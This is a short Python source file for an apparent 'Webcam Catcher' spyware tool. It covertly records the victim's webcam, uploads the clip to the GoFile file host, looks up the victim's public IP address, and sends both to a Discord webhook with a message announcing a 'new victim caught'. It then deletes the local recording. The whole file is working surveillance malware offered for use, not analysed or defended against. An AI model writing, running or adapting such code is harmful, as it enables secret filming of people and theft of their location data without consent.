import os, cv2, requests, time, gofile2, datetime

#Big Chunk of this code is done by github.com/Rdimo I only Edited/added some stuff + fixed few 

class WebcamRecorder():
    def __init__(self):
        self.filename = 'video.mp4' #just the file name for the video file will be deleted aftet uploaded
        self.webhook = '' #Webhook url for GoFile Link to be send to

        self.Recorder()

    def change_res(self, cap, width, height):
        cap.set(3, width)
        cap.set(4, height)
        
    def get_dims(self, cap, res='1080p'):
        STD_DIMENSIONS =  {
            "480p": (640, 480),
            "720p": (1280, 720),
            "1080p": (1920, 1080),
            "4k": (3840, 2160),
        }
        width, height = STD_DIMENSIONS["480p"]
        if res in STD_DIMENSIONS:
            width,height = STD_DIMENSIONS[res]
        self.change_res(cap, width, height)
        return width, height

    def Recorder(self):
        temp = os.path.join(f"{os.getenv('TEMP')}\\{self.filename}")
        res = '720p'
        t_end = time.time() + 2 #change this to the amount of time you want to record

        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            out = cv2.VideoWriter(temp, 0x00000021, 15.0, self.get_dims(cap, res)) # Ive got no idea how this line works but it works. Yay!
            while time.time() < t_end:
                ret, frame = cap.read()
                out.write(frame)
            cap.release()
            out.release()
            cv2.destroyAllWindows()
            g_a = gofile2.Gofile()
            videoUrl = g_a.upload(file=temp)
            self.webcam = f"**Webcam: [{videoUrl['downloadPage']}]({videoUrl['downloadPage']})**"
            self.WebhookSender(self.webcam)
            os.remove(temp)
        else:
            self.webcam = "**No Webcam found**"
            self.WebhookSender(self.webcam)

    def WebhookSender(self, webcam):
        today = datetime.date.today()
        data = requests.get("http://ipinfo.io/json").json()
        ipd = data['ip']
        embed = {
            "avatar_url":"https://i.imgur.com/QVCVjM4.png",
            "name":"Webcam Catcher",
            "embeds": [
                {
                    "author": {
                        "name": "𝓦𝓮𝓫𝓬𝓪𝓶 𝓒𝓪𝓽𝓬𝓱𝓮𝓻",
                        "icon_url": "https://i.imgur.com/QVCVjM4.png",
                        },
                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝗰𝗮𝘂𝗴𝗵𝘁\n Using Ip: {ipd}\n{webcam}",
                    "color": 8421504,
                    "footer": {
                      "text": f"Cam Recorder Caught Someone lacking at・{today}"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)

if __name__ == "__main__":
    WebcamRecorder()